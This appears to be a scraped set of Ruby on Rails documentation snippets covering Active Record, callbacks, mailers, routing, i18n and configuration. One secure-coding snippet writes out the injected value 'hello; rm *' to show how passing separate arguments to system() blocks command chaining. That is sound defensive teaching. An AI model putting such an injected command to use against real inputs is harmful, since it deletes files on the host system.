DESCRIPTION: This code demonstrates how to define different callback types for different lifecycle events using multiple define_model_callbacks calls. It creates only after_create, before_update, and around_destroy methods.

LANGUAGE: ruby
CODE:
define_model_callbacks :create, only: :after
define_model_callbacks :update, only: :before
define_model_callbacks :destroy, only: :around

----------------------------------------

TITLE: Generating a Products Controller with Rails
DESCRIPTION: Creates a ProductsController with an index action using the Rails generator command. The --skip-routes flag prevents generator from adding routes since they already exist.

LANGUAGE: bash
CODE:
$ bin/rails generate controller Products index --skip-routes

----------------------------------------

TITLE: Checking Previous Attribute Changes with _previously_changed? in Rails
DESCRIPTION: Shows the [attr_name]_previously_changed? method which checks if an attribute was changed before the model was saved. Returns false before saving and true after.

LANGUAGE: irb
CODE:
irb> person.first_name_previously_changed?
=> false
irb> person.save
irb> person.first_name_previously_changed?
=> true

----------------------------------------

TITLE: Adding Development Container to Existing Rails Application
DESCRIPTION: Command to add development container configuration to an existing Rails application using the devcontainer generator command.

LANGUAGE: bash
CODE:
$ rails devcontainer

----------------------------------------

TITLE: Using Time.current in Ruby on Rails
DESCRIPTION: Time.current is a convenient method that returns Time.zone.now if a user time zone is defined, otherwise falls back to Time.now.

LANGUAGE: ruby
CODE:
Time.zone_default
# => #<ActiveSupport::TimeZone:0x7f73654d4f38 @utc_offset=nil, @name="Madrid", ...>
Time.current
# => Fri, 06 Aug 2010 17:11:58 CEST +02:00

----------------------------------------

TITLE: Generating a belongs_to Association Migration in Rails
DESCRIPTION: This command shows an alternative way to generate a foreign key association using belongs_to, which is an alias of references.

LANGUAGE: bash
CODE:
$ bin/rails generate migration AddUserRefToProducts user:belongs_to

----------------------------------------

TITLE: Creating a Join Table Migration for has_and_belongs_to_many Association
DESCRIPTION: Shows how to create a migration for a join table needed for a has_and_belongs_to_many association, ensuring it has no primary key.

LANGUAGE: ruby
CODE:
class CreateAssembliesPartsJoinTable < ActiveRecord::Migration[8.1]
  def change
    create_table :assemblies_parts, id: false do |t|
      t.bigint :assembly_id
      t.bigint :part_id
    end

    add_index :assemblies_parts, :assembly_id
    add_index :assemblies_parts, :part_id
  end
end

----------------------------------------

TITLE: Viewing Model Column Names in Rails Console
DESCRIPTION: Code to display all database columns for the Product model. Rails automatically detects columns from the database table and makes them available as attributes.

LANGUAGE: irb
CODE:
store(dev)> Product.column_names

----------------------------------------

TITLE: Using flash.keep with Rails Controllers
DESCRIPTION: Demonstrates how to persist flash values through multiple redirects using flash.keep. The example shows preserving all flash values or specific keys before redirecting to another URL.

LANGUAGE: ruby
CODE:
class MainController < ApplicationController
  def index
    # Will persist all flash values.
    flash.keep

    # You can also use a key to keep only some kind of value.
    # flash.keep(:notice)
    redirect_to users_url
  end
end

----------------------------------------

TITLE: Default Rescue Responses Configuration in Rails
DESCRIPTION: Shows the default exception to HTTP status code mappings in Rails. This hash maps various controller, dispatcher and model exceptions to appropriate HTTP status codes like not_found, bad_request, etc.

LANGUAGE: ruby
CODE:
{
  "ActionController::RoutingError" => :not_found,
  "AbstractController::ActionNotFound" => :not_found,
  "ActionController::MethodNotAllowed" => :method_not_allowed,
  "ActionController::UnknownHttpMethod" => :method_not_allowed,
  "ActionController::NotImplemented" => :not_implemented,
  "ActionController::UnknownFormat" => :not_acceptable,
  "ActionDispatch::Http::MimeNegotiation::InvalidType" => :not_acceptable,
  "ActionController::MissingExactTemplate" => :not_acceptable,
  "ActionController::InvalidAuthenticityToken" => :unprocessable_entity,
  "ActionController::InvalidCrossOriginRequest" => :unprocessable_entity,
  "ActionDispatch::Http::Parameters::ParseError" => :bad_request,
  "ActionController::BadRequest" => :bad_request,
  "ActionController::ParameterMissing" => :bad_request,
  "Rack::QueryParser::ParameterTypeError" => :bad_request,
  "Rack::QueryParser::InvalidParameterError" => :bad_request,
  "ActiveRecord::RecordNotFound" => :not_found,
  "ActiveRecord::StaleObjectError" => :conflict,
  "ActiveRecord::RecordInvalid" => :unprocessable_entity,
  "ActiveRecord::RecordNotSaved" => :unprocessable_entity
}

----------------------------------------

TITLE: Setting Default Queue Name for ActiveJob in Rails
DESCRIPTION: Changes the default queue name for ActiveJob from the default value of "default" to a custom queue name. This configuration affects where jobs will be queued if no specific queue is specified.

LANGUAGE: ruby
CODE:
config.active_job.default_queue_name = :medium_priority

----------------------------------------

TITLE: Secure Command Execution in Ruby Using Parameter Separation
DESCRIPTION: Safe alternative to passing user input to system commands by using system() with separate parameters, which prevents command chaining.

LANGUAGE: ruby
CODE:
system("/bin/echo", "hello; rm *")
# prints "hello; rm *" and does not delete files

----------------------------------------

TITLE: Implementing Internationalization with ActiveModel::Translation
DESCRIPTION: This snippet shows how to add internationalization support to a Ruby class using ActiveModel::Translation. It extends the Person class to allow for attribute name translations.

LANGUAGE: ruby
CODE:
class Person
  extend ActiveModel::Translation
end

----------------------------------------

TITLE: Using session#fetch Method in Rails
DESCRIPTION: The new session#fetch method behaves similarly to Hash#fetch, with the exception that the returned value is always saved into the session.

LANGUAGE: ruby
CODE:
session#fetch

----------------------------------------

TITLE: Using after_destroy_commit Alias
DESCRIPTION: Example showing the use of after_destroy_commit, which is an alias for after_commit with on: :destroy. This provides a cleaner syntax for this common use case.

LANGUAGE: ruby
CODE:
class PictureFile < ApplicationRecord
  after_destroy_commit :delete_picture_file_from_disk

  def delete_picture_file_from_disk
    if File.exist?(filepath)
      File.delete(filepath)
    end
  end
end

----------------------------------------

TITLE: Using attribute_names Method with ActiveModel::Attributes
DESCRIPTION: This snippet shows how to use the attribute_names method that becomes available when including ActiveModel::Attributes. It returns an array of attribute names defined in the class.

LANGUAGE: ruby
CODE:
irb> Person.attribute_names
=> ["name", "date_of_birth", "active"]

----------------------------------------

TITLE: Cache Exist Event Structure in Active Support
DESCRIPTION: Shows the structure of the payload for the cache_exist?.active_support event. Includes the key being checked and the store class name.

LANGUAGE: ruby
CODE:
{
  key: "name-of-complicated-computation",
  store: "ActiveSupport::Cache::MemCacheStore"
}

----------------------------------------

TITLE: Getting Parameter Key for Model in Rails
DESCRIPTION: Demonstrates the model_name.param_key method which returns a string to use for params names in forms and controllers.

LANGUAGE: irb
CODE:
irb> Person.model_name.param_key
=> "person"

----------------------------------------

TITLE: Rendering Custom Templates in Rails Mailers with Format Blocks
DESCRIPTION: Ruby code demonstrating how to use format blocks to render different templates or inline content for HTML and text parts of a multipart email.

LANGUAGE: ruby
CODE:
class UserMailer < ApplicationMailer
  default from: "notifications@example.com"

  def welcome_email
    @user = params[:user]
    @url  = "http://example.com/login"
    mail(to: @user.email,
         subject: "Welcome to My Awesome Site") do |format|
      format.html { render "another_template" }
      format.text { render plain: "hello" }
    end
  end
end

----------------------------------------

TITLE: Registering Custom Serializers in Rails Configuration
DESCRIPTION: Shows how to register a custom serializer with Active Job by adding it to the custom_serializers configuration list in an initializer.

LANGUAGE: ruby
CODE:
# config/initializers/custom_serializers.rb
Rails.application.config.active_job.custom_serializers << MoneySerializer

----------------------------------------

TITLE: Generating Rails Application with Development Container Support
DESCRIPTION: Command to generate a new Rails application with development container configuration, which includes a Docker setup with Redis, database, headless Chrome for testing, and Active Storage configuration.

LANGUAGE: bash
CODE:
$ rails new myapp --devcontainer

----------------------------------------

TITLE: Generating Model Test with Rails Generator
DESCRIPTION: Shows the command to generate a skeleton test file for an Article model in Rails.

LANGUAGE: bash
CODE:
$ bin/rails generate test_unit:model article
create  test/models/article_test.rb

----------------------------------------

TITLE: Batch Processing Records with Active Record in Ruby on Rails
DESCRIPTION: How to process large sets of records without loading all records into memory at once. Demonstrates inefficient approach followed by memory-efficient batch processing methods.

LANGUAGE: ruby
CODE:
# This may consume too much memory if the table is big.
Customer.all.each do |customer|
  NewsMailer.weekly(customer).deliver_now
end

LANGUAGE: ruby
CODE:
Customer.find_each do |customer|
  NewsMailer.weekly(customer).deliver_now
end

LANGUAGE: ruby
CODE:
Customer.where(weekly_subscriber: true).find_each do |customer|
  NewsMailer.weekly(customer).deliver_now
end

LANGUAGE: ruby
CODE:
Customer.find_each(batch_size: 5000) do |customer|
  NewsMailer.weekly(customer).deliver_now
end

LANGUAGE: ruby
CODE:
Customer.find_each(start: 2000) do |customer|
  NewsMailer.weekly(customer).deliver_now
end

LANGUAGE: ruby
CODE:
Customer.find_each(start: 2000, finish: 10000) do |customer|
  NewsMailer.weekly(customer).deliver_now
end

LANGUAGE: ruby
CODE:
Customer.find_each(order: :desc) do |customer|
  NewsMailer.weekly(customer).deliver_now
end

LANGUAGE: ruby
CODE:
# Give add_customers an array of 1000 customers at a time.
Customer.find_in_batches do |customers|
  export.add_customers(customers)
end

----------------------------------------

TITLE: Generated SQL for Cross-Database has_one through Association with disable_joins
DESCRIPTION: Example of SQL queries generated when using disable_joins option with a has_one through association. Rails performs two separate queries instead of attempting a join across databases.

LANGUAGE: sql
CODE:
SELECT "home"."id" FROM "homes" WHERE "homes"."dog_id" = ? [["dog_id", 1]]
SELECT "yards".* FROM "yards" WHERE "yards"."home_id" = ? [["home_id", 1]]

----------------------------------------

TITLE: Setting Locale from User Preferences in Rails
DESCRIPTION: Controller action to switch locale based on authenticated user preferences stored in the database, falling back to the default locale if needed.

LANGUAGE: ruby
CODE:
around_action :switch_locale

def switch_locale(&action)
  locale = current_user.try(:locale) || I18n.default_locale
  I18n.with_locale(locale, &action)
end

----------------------------------------

TITLE: Creating Parameterized Scopes in Rails Models
DESCRIPTION: This snippet shows how to define scopes that accept arguments, allowing for more flexible querying. It also compares scope definitions with equivalent class methods.

LANGUAGE: ruby
CODE:
class Book < ApplicationRecord
  scope :costs_more_than, ->(amount) { where("price > ?", amount) }
end

LANGUAGE: irb
CODE:
irb> Book.costs_more_than(100.10)

LANGUAGE: ruby
CODE:
class Book < ApplicationRecord
  def self.costs_more_than(amount)
    where("price > ?", amount)
  end
end

LANGUAGE: irb
CODE:
irb> author.books.costs_more_than(100.10)

----------------------------------------

TITLE: Checking and Creating HTML Safe Strings in Ruby
DESCRIPTION: Demonstrates checking if a string is HTML safe and converting strings to safe strings using the html_safe method. Safe strings can be inserted into HTML without escaping.

LANGUAGE: ruby
CODE:
"".html_safe? # => false

----------------------------------------

TITLE: Using Pattern Matching with JSON Response Bodies in Rails Tests
DESCRIPTION: Example demonstrating how to use Ruby's pattern matching with JSON responses in integration tests. The response.parsed_body provides indifferent access to JSON data, enabling clean assertions with pattern matching.

LANGUAGE: ruby
CODE:
get "/posts.json"

response.content_type         # => "application/json; charset=utf-8"
response.parsed_body.class    # => Array
response.parsed_body          # => [{"id"=>42, "title"=>"Title"},...

assert_pattern { response.parsed_body => [{ id: 42 }] }

get "/posts/42.json"

response.content_type         # => "application/json; charset=utf-8"
response.parsed_body.class    # => ActiveSupport::HashWithIndifferentAccess
response.parsed_body          # => {"id"=>42, "title"=>"Title"}

assert_pattern { response.parsed_body => [{ title: /title/i }] }

----------------------------------------

TITLE: Creating a Model Class for ActiveModel Lint Tests
DESCRIPTION: This snippet shows how to create a simple Person model that implements the ActiveModel API. It uses ActiveModel::API module to include the necessary functionality for testing.

LANGUAGE: ruby
CODE:
class Person
  include ActiveModel::API
end

----------------------------------------

TITLE: Using Where Clauses with Column-Tuple Syntax in Active Record
DESCRIPTION: Example demonstrating the new column-tuple syntax for where clauses in Active Record queries. This syntax allows querying a table by multiple column values at once, providing a more concise way to handle multi-column conditions.

LANGUAGE: ruby
CODE:
Topic.where([:title, :author_name] => [["The Alchemist", "Paulo Coelho"], ["Harry Potter", "J.K Rowling"]])

----------------------------------------

TITLE: Overriding Select Clause with reselect in ActiveRecord
DESCRIPTION: Shows how to use the 'reselect' method to replace an existing select statement with a new one instead of adding to it.

LANGUAGE: ruby
CODE:
Book.select(:title, :isbn).reselect(:created_at)

LANGUAGE: sql
CODE:
SELECT books.created_at FROM books

LANGUAGE: ruby
CODE:
Book.select(:title, :isbn).select(:created_at)

LANGUAGE: sql
CODE:
SELECT books.title, books.isbn, books.created_at FROM books

----------------------------------------

TITLE: Redis Adapter with SSL/TLS Configuration in YAML
DESCRIPTION: Configuration for Redis adapter with SSL/TLS connection settings. This shows how to set up a secure Redis connection with SSL certificate validation parameters for production environments.

LANGUAGE: yaml
CODE:
production:
  adapter: redis
  url: rediss://10.10.3.153:tls_port
  channel_prefix: appname_production
  ssl_params:
    ca_file: "/path/to/ca.crt"

----------------------------------------

TITLE: Using config.autoload_lib for Lib Directory in Ruby
DESCRIPTION: The recommended approach in Rails 7.1+ for configuring lib directory autoloading. This concise configuration autoloads the lib directory but ignores specified subdirectories.

LANGUAGE: ruby
CODE:
config.autoload_lib(ignore: %w(assets tasks))

----------------------------------------

TITLE: Configuring Error Reporting in ApplicationJob
DESCRIPTION: Example of manually hooking into Active Job's error handling to report exceptions to an error tracking service. This code adds a rescue_from block to capture and report all exceptions while still re-raising them.

LANGUAGE: ruby
CODE:
class ApplicationJob < ActiveJob::Base
  rescue_from(Exception) do |exception|
    Rails.error.report(exception)
    raise exception
  end
end

----------------------------------------

TITLE: Using form_with in Rails 5.1 with URL, Scope, and Model
DESCRIPTION: Demonstrates the new form_with helper in Rails 5.1 which unifies form_for and form_tag. Shows examples with URL-based forms, scoped forms, and model-based forms including both creation and update scenarios.

LANGUAGE: erb
CODE:
<%= form_with url: posts_path do |form| %>
  <%= form.text_field :title %>
<% end %>

<%# Will generate %>

<form action="/posts" method="post" data-remote="true">
  <input type="text" name="title">
</form>

LANGUAGE: erb
CODE:
<%= form_with scope: :post, url: posts_path do |form| %>
  <%= form.text_field :title %>
<% end %>

<%# Will generate %>

<form action="/posts" method="post" data-remote="true">
  <input type="text" name="post[title]">
</form>

LANGUAGE: erb
CODE:
<%= form_with model: Post.new do |form| %>
  <%= form.text_field :title %>
<% end %>

<%# Will generate %>

<form action="/posts" method="post" data-remote="true">
  <input type="text" name="post[title]">
</form>

LANGUAGE: erb
CODE:
<%= form_with model: Post.first do |form| %>
  <%= form.text_field :title %>
<% end %>

<%# Will generate %>

<form action="/posts/1" method="post" data-remote="true">
  <input type="hidden" name="_method" value="patch">
  <input type="text" name="post[title]" value="<the title of the post>">
</form>

----------------------------------------

TITLE: Extracting Locale from Accept-Language Header in Rails
DESCRIPTION: Method to determine locale based on the browser's Accept-Language HTTP header, extracting the first two-letter language code provided by the client.

LANGUAGE: ruby
CODE:
def switch_locale(&action)
  logger.debug "* Accept-Language: #{request.env['HTTP_ACCEPT_LANGUAGE']}"
  locale = extract_locale_from_accept_language_header
  logger.debug "* Locale set to '#{locale}'"
  I18n.with_locale(locale, &action)
end

private
  def extract_locale_from_accept_language_header
    request.env["HTTP_ACCEPT_LANGUAGE"].scan(/^[a-z]{2}/).first
  end

----------------------------------------

TITLE: Handling Invalid DateTime Changes in Ruby
DESCRIPTION: The change method throws an ArgumentError when attempting to create an invalid date, such as February 30th.

LANGUAGE: ruby
CODE:
DateTime.current.change(month: 2, day: 30)
# => ArgumentError: invalid date

----------------------------------------

TITLE: Testing Touch Callbacks in Rails Console
DESCRIPTION: IRB example demonstrating how after_touch callbacks are triggered when the touch method is called on a model instance. The example shows the creation of a user record and the callback's response to the touch operation.

LANGUAGE: irb
CODE:
irb> user = User.create(name: "Kuldeep")
=> #<User id: 1, name: "Kuldeep", created_at: "2013-11-25 12:17:49", updated_at: "2013-11-25 12:17:49">

irb> user.touch
You have touched an object
=> true

----------------------------------------

TITLE: Rendering Shared Partials in Rails Views
DESCRIPTION: Demonstrating how to use shared partials with template inheritance, where partials can be placed in app/views/application/ and reused across different controllers and actions.

LANGUAGE: erb
CODE:
<%# app/views/admin/products/index.html.erb %>
<%= render @products || "empty_list" %>

<%# app/views/application/_empty_list.html.erb %>
There are no items in this list <em>yet</em>.

----------------------------------------

TITLE: Wrapping Objects in Arrays with Array.wrap in Rails
DESCRIPTION: Demonstrates the Array.wrap method which intelligently wraps objects in arrays. It handles nil values, existing arrays, and single objects differently than Kernel#Array, particularly with handling of hash objects.

LANGUAGE: ruby
CODE:
Array.wrap(nil)       # => []
Array.wrap([1, 2, 3]) # => [1, 2, 3]
Array.wrap(0)         # => [0]

LANGUAGE: ruby
CODE:
Array.wrap(foo: :bar) # => [{:foo=>:bar}]
Array(foo: :bar)      # => [[:foo, :bar]]

----------------------------------------

TITLE: Loading Rails Components in rails/all.rb
DESCRIPTION: The rails/all.rb file that requires all the individual Rails frameworks and makes them available to the application.

LANGUAGE: ruby
CODE:
require "rails"

%w(
  active_record/railtie
  active_storage/engine
  action_controller/railtie
  action_view/railtie
  action_mailer/railtie
  active_job/railtie
  action_cable/engine
  action_mailbox/engine
  action_text/engine
  rails/test_unit/railtie
).each do |railtie|
  begin
    require railtie
  rescue LoadError
  end
end

----------------------------------------

TITLE: Using flash.now in Rails Controllers
DESCRIPTION: Shows how to use flash.now to make flash values available in the current request rather than the next request. This is useful when rendering templates directly instead of redirecting.

LANGUAGE: ruby
CODE:
class ClientsController < ApplicationController
  def create
    @client = Client.new(client_params)
    if @client.save
      # ...
    else
      flash.now[:error] = "Could not save client"
      render action: "new"
    end
  end
end

----------------------------------------

TITLE: Using <%== Syntax for Unescaped Output in ERB
DESCRIPTION: Shows the alternative <%== syntax which is equivalent to using the raw helper for inserting unescaped content.

LANGUAGE: erb
CODE:
<%== @cms.current_template %> <%# inserts @cms.current_template as is %>

----------------------------------------

TITLE: Joining Tables Using Raw SQL in ActiveRecord
DESCRIPTION: Shows how to join tables using a raw SQL fragment with the joins method. This example creates a custom INNER JOIN between authors and books tables with an additional condition to filter for books that are not out of print.

LANGUAGE: ruby
CODE:
Author.joins("INNER JOIN books ON books.author_id = authors.id AND books.out_of_print = FALSE")

LANGUAGE: sql
CODE:
SELECT authors.* FROM authors INNER JOIN books ON books.author_id = authors.id AND books.out_of_print = FALSE

----------------------------------------

TITLE: Validating Exclusion from a Set in Rails
DESCRIPTION: Demonstrates how to validate that an attribute's value is excluded from a reserved set using the exclusion validator. The example prevents using reserved subdomains.

LANGUAGE: ruby
CODE:
class Account < ApplicationRecord
  validates :subdomain, exclusion: { in: %w(www us ca jp),
    message: "%{value} is reserved." }
end

----------------------------------------

TITLE: Configuring SHA-256 for Active Record Encryption in Rails 7.1
DESCRIPTION: Shows how to configure Active Record Encryption to use SHA-256 in Rails 7.1 when key_generator_hash_digest_class is set to SHA-256.

LANGUAGE: ruby
CODE:
config.active_record.encryption.hash_digest_class = OpenSSL::Digest::SHA256

----------------------------------------

TITLE: Using Lambda without Record Argument in Validators
DESCRIPTION: Example showing the simplified lambda syntax for validators, which no longer requires a dummy record parameter. This makes validation code more concise when accessing only global values.

LANGUAGE: ruby
CODE:
# Before
validates_comparison_of :birth_date, less_than_or_equal_to: ->(_record) { Date.today }

# After
validates_comparison_of :birth_date, less_than_or_equal_to: -> { Date.today }

----------------------------------------

TITLE: Opting Out of Eager Loading for Lib Directory in Ruby
DESCRIPTION: Configuration to prevent the autoloaded lib directory from being eager loaded even when config.eager_load is true. This keeps the previous behavior if lib was not eager loaded before.

LANGUAGE: ruby
CODE:
Rails.autoloaders.main.do_not_eager_load(config.root.join("lib"))

----------------------------------------

TITLE: Using TimeZone#strptime for timezone-aware parsing
DESCRIPTION: Allows parsing times as if from a given timezone, providing better support for working with time strings in different timezones.

LANGUAGE: ruby
CODE:
ActiveSupport::TimeZone#strptime

----------------------------------------

TITLE: Converting Active Record Scope Syntax in Rails 4.0
DESCRIPTION: Rails 4.0 requires that scopes use a callable object such as a Proc or lambda instead of the previous direct query methods. This example shows how to update scope definitions to the new required syntax.

LANGUAGE: ruby
CODE:
scope :active, where(active: true)

# becomes
scope :active, -> { where active: true }

----------------------------------------

TITLE: Creating Inventory Status Partial in Rails
DESCRIPTION: ERB partial to display product inventory status and subscription form for out-of-stock products.

LANGUAGE: erb
CODE:
<% if product.inventory_count? %>
  <p><%= product.inventory_count %> in stock</p>
<% else %>
  <p>Out of stock</p>
  <p>Email me when available.</p>

  <%= form_with model: [product, Subscriber.new] do |form| %>
    <%= form.email_field :email, placeholder: "you@example.com", required: true %>
    <%= form.submit "Submit" %>
  <% end %>
<% end %>

----------------------------------------

TITLE: Defining Route for Composite Key Parameters
DESCRIPTION: A routing configuration example that defines a route for handling composite key parameters in a books controller.

LANGUAGE: ruby
CODE:
get "/books/:id", to: "books#show"

----------------------------------------

TITLE: Sending Email with Recipient's Name in Action Mailer
DESCRIPTION: Example of using the email_address_with_name method to include the recipient's name along with their email address in the 'to' field of an email, enhancing the personalization of the message.

LANGUAGE: ruby
CODE:
def welcome_email
  @user = params[:user]
  mail(
    to: email_address_with_name(@user.email, @user.name),
    subject: "Welcome to My Awesome Site"
  )
end

----------------------------------------

TITLE: Nested XML Output from Builder
DESCRIPTION: The HTML output produced by the nested XML Builder template, showing hierarchical content structure.

LANGUAGE: html
CODE:
<div>
  <h1>David Heinemeier Hansson</h1>
  <p>A product of Danish Design during the Winter of '79...</p>
</div>

----------------------------------------

TITLE: Generating Date Ranges in Rails
DESCRIPTION: Methods for generating date ranges for different time periods like week, month, quarter, or year.

LANGUAGE: ruby
CODE:
Date#all_week

LANGUAGE: ruby
CODE:
Date#all_month

LANGUAGE: ruby
CODE:
Date#all_quarter

LANGUAGE: ruby
CODE:
Date#all_year

----------------------------------------

TITLE: Setting Custom Layout for a Mailer Class in Rails
DESCRIPTION: Example of configuring a custom layout for all emails in a specific mailer class using the layout method. This overrides the default layout specified in ApplicationMailer.

LANGUAGE: ruby
CODE:
class UserMailer < ApplicationMailer
  layout "awesome" # Use awesome.(html|text).erb as the layout
end

----------------------------------------

TITLE: Using Multiple Placeholders in ActiveRecord Conditions
DESCRIPTION: Shows how to use multiple placeholders in a query condition to safely include several parameters in a database query while preventing SQL injection.

LANGUAGE: ruby
CODE:
Book.where("title = ? AND out_of_print = ?", params[:title], false)

----------------------------------------

TITLE: Rolling Back Multiple Migrations with STEP Parameter
DESCRIPTION: Command to roll back multiple migrations at once by providing the STEP parameter to the db:rollback task, which specifies how many migrations to roll back.

LANGUAGE: bash
CODE:
$ bin/rails db:rollback STEP=3

----------------------------------------

TITLE: Implementing Server Command in Rails
DESCRIPTION: Executes the server command by initializing and starting a Rails server instance, loading the application and setting up the proper environment.

LANGUAGE: ruby
CODE:
module Rails
  module Command
    class ServerCommand < Base # :nodoc:
      def perform
        set_application_directory!
        prepare_restart

        Rails::Server.new(server_options).tap do |server|
          # Require application after server sets environment to propagate
          # the --environment option.
          require APP_PATH
          Dir.chdir(Rails.application.root)

          if server.serveable?
            print_boot_information(server.server, server.served_url)
            after_stop_callback = -> { say "Exiting" unless options[:daemon] }
            server.start(after_stop_callback)
          else
            say rack_server_suggestion(options[:using])
          end
        end
      end
    end
  end
end

----------------------------------------

TITLE: Setting Strict Locals in ERB Templates
DESCRIPTION: Example showing how to set explicit locals in ERB templates using magic comments. The code demonstrates defining required locals, setting default values, using optional keyword arguments with splat, and disabling locals entirely.

LANGUAGE: erb
CODE:
<%# locals: (message:) -%>
<%= message %>

----------------------------------------

TITLE: Rendering XML Response
DESCRIPTION: Converting an object to XML and sending it as a response using the :xml option to render. Rails automatically calls to_xml on the object being rendered.

LANGUAGE: ruby
CODE:
render xml: @product

----------------------------------------

TITLE: Configuring Retry and Discard Behavior for Failed Jobs
DESCRIPTION: Shows how to use retry_on and discard_on to configure automatic retry behavior or discard certain exceptions in a job. This example retries CustomAppException but discards DeserializationError.

LANGUAGE: ruby
CODE:
class RemoteServiceJob < ApplicationJob
  retry_on CustomAppException # defaults to 3s wait, 5 attempts

  discard_on ActiveJob::DeserializationError

  def perform(*args)
    # Might raise CustomAppException or ActiveJob::DeserializationError
  end
end

----------------------------------------

TITLE: Configuring Per-attribute Encryption in ActiveRecord
DESCRIPTION: Demonstrates how to override default encryption context parameters for a specific attribute by passing custom options in the attribute declaration.

LANGUAGE: ruby
CODE:
class Attribute
  encrypts :title, encryptor: MyAttributeEncryptor.new
end

----------------------------------------

TITLE: Customizing Validation Messages with YAML Locale Configuration
DESCRIPTION: YAML configuration for customizing validation error messages at both model and attribute levels. This demonstrates how to override the default error message format for specific models and attributes.

LANGUAGE: yml
CODE:
en:
  activemodel: # or activerecord:
    errors:
      models:
        person:
          # Override the format for all Person attributes:
          format: "Invalid %{attribute} (%{message})"
          attributes:
            age:
              # Override the format for the age attribute:
              format: "%{message}"
              blank: "Please fill in your %{attribute}"

----------------------------------------

TITLE: Enabling SHA-1 Support for Previously Encrypted Data in Rails 7.1
DESCRIPTION: Shows how to enable support for non-deterministic encryption using SHA-1 for data encrypted in previous Rails versions.

LANGUAGE: ruby
CODE:
config.active_record.encryption.support_sha1_for_non_deterministic_encryption = true

----------------------------------------

TITLE: Using Symbol Method for Conditional Validation in Rails
DESCRIPTION: Shows how to use the :if option with a symbol representing a method name for conditional validation. The validation only runs when the referenced method returns true.

LANGUAGE: ruby
CODE:
class Order < ApplicationRecord
  validates :card_number, presence: true, if: :paid_with_card?

  def paid_with_card?
    payment_type == "card"
  end
end

----------------------------------------

TITLE: Setting Database URL in Environment Variable
DESCRIPTION: Example of configuring a database connection using an environment variable instead of the database.yml file. This connects to a PostgreSQL database with a connection pool size of 5.

LANGUAGE: ruby
CODE:
ENV["DATABASE_URL"] # => "postgresql://localhost/blog_development?pool=5"

----------------------------------------

TITLE: Generating a new API-only Rails application
DESCRIPTION: Command to create a new Rails application configured for API-only usage. This creates a slimmed-down application without browser-specific middleware and configuration.

LANGUAGE: bash
CODE:
$ rails new my_api --api

----------------------------------------

TITLE: Exploring Test Directory Structure in Rails
DESCRIPTION: Shows the directory structure created by Rails for testing, including folders for different types of tests like controllers, models, and helpers.

LANGUAGE: bash
CODE:
$ ls -F test
application_system_test_case.rb  controllers/                     helpers/                         mailers/                         system/                          fixtures/                        integration/                     models/                          test_helper.rb

----------------------------------------

TITLE: Using pick in Ruby on Rails
DESCRIPTION: The pick method extracts the given key from the first element in an enumerable. It can extract a single key or multiple keys. Defined in active_support/core_ext/enumerable.rb.

LANGUAGE: ruby
CODE:
[{ name: "David" }, { name: "Rafael" }, { name: "Aaron" }].pick(:name) # => "David"
[{ id: 1, name: "David" }, { id: 2, name: "Rafael" }].pick(:id, :name) # => [1, "David"]

----------------------------------------

TITLE: Creating Custom Callback Objects in Ruby on Rails
DESCRIPTION: Shows how to define and use a custom callback object. The AddUsername class implements a before_validation method that is called when the callback is triggered, setting username to email when username is blank.

LANGUAGE: ruby
CODE:
class User < ApplicationRecord
  validates :username, :email, presence: true

  before_validation AddUsername
end

class AddUsername
  def self.before_validation(record)
    if record.username.blank?
      record.username = record.email
    end
  end
end

----------------------------------------

TITLE: Mixed Layout Usage in Rails Controller Hierarchy
DESCRIPTION: Example of complex layout inheritance with a controller that disables layouts by default but uses different layout settings for specific actions.

LANGUAGE: ruby
CODE:
class OldArticlesController < SpecialArticlesController
  layout false

  def show
    @article = Article.find(params[:id])
  end

  def index
    @old_articles = Article.older
    render layout: "old"
  end
  # ...
end

----------------------------------------

TITLE: Storing Translations in YAML Format
DESCRIPTION: Example of how to store translations in YAML format, which is the recommended approach. The structure mirrors the Ruby Hash example with locale as the top level key.

LANGUAGE: yaml
CODE:
pt:
  foo:
    bar: baz

----------------------------------------

TITLE: Retrieving has_one Associations in Rails
DESCRIPTION: This snippet shows how to retrieve an associated object using the has_one association method. It demonstrates accessing the cached version and forcing a reload from the database.

LANGUAGE: ruby
CODE:
@account = @supplier.account

----------------------------------------

TITLE: Creating Readonly Objects in ActiveRecord
DESCRIPTION: Shows how to use the 'readonly' method to create objects that cannot be modified, throwing an exception if a save is attempted after changes.

LANGUAGE: ruby
CODE:
customer = Customer.readonly.first
customer.visits += 1
customer.save # Raises an ActiveRecord::ReadOnlyRecord

----------------------------------------

TITLE: Creating a Rails 3.0 Application from Local Repository
DESCRIPTION: Shows how to generate a new Rails application using a local checkout of the Rails repository by using the --dev flag. This is useful for Rails core development or testing unreleased features.

LANGUAGE: bash
CODE:
$ ruby /path/to/rails/bin/rails new myapp --dev

----------------------------------------

TITLE: Disabling Content Security Policy for Specific Controller Actions
DESCRIPTION: This controller example demonstrates how to disable the Content Security Policy for specific actions (in this case, only for the index action) which might be necessary for legacy pages that aren't compatible with CSP.

LANGUAGE: ruby
CODE:
class LegacyPagesController < ApplicationController
  content_security_policy false, only: :index
end

----------------------------------------

TITLE: Creating a Table with Association References
DESCRIPTION: Migration that creates a table with a reference to another model. This creates a foreign key column named category_id that references the categories table.

LANGUAGE: ruby
CODE:
create_table :products do |t|
  t.references :category
end

----------------------------------------

TITLE: Using Return to Prevent Double Render Errors in Rails
DESCRIPTION: Fixed version of the previous code that uses return to exit the method after the first render call, preventing the double render error by ensuring only one render occurs.

LANGUAGE: ruby
CODE:
def show
  @book = Book.find(params[:id])
  if @book.special?
    render action: "special_show"
    return
  end
  render action: "regular_show"
end

----------------------------------------

TITLE: Updating Crop Parameters for Active Storage Vips Migration
DESCRIPTION: Demonstrates how to change image cropping parameters from ImageMagick's string format to libvips' array format when migrating to the vips variant processor.

LANGUAGE: ruby
CODE:
- variant(crop: "1920x1080+0+0")
+ variant(crop: [0, 0, 1920, 1080])

----------------------------------------

TITLE: Converting Numeric Values to Milliseconds in Rails
DESCRIPTION: Method for converting numeric duration values to milliseconds, useful for JavaScript interoperability.

LANGUAGE: ruby
CODE:
1.hour.in_milliseconds

----------------------------------------

TITLE: CSS with Digested Asset Path
DESCRIPTION: Shows how Propshaft transforms a regular asset URL into a digested URL. This is the output after the asset pipeline processes the CSS file for production use.

LANGUAGE: css
CODE:
background: url("/assets/bg/pattern-2169cbef.svg");

----------------------------------------

TITLE: Creating Rails Application from Local Development Copy
DESCRIPTION: Command to generate a Rails application using a local checkout of the Rails repository with the --dev flag, useful for developers working with custom Rails versions.

LANGUAGE: bash
CODE:
$ ruby /path/to/rails/railties/bin/rails new myapp --dev

----------------------------------------

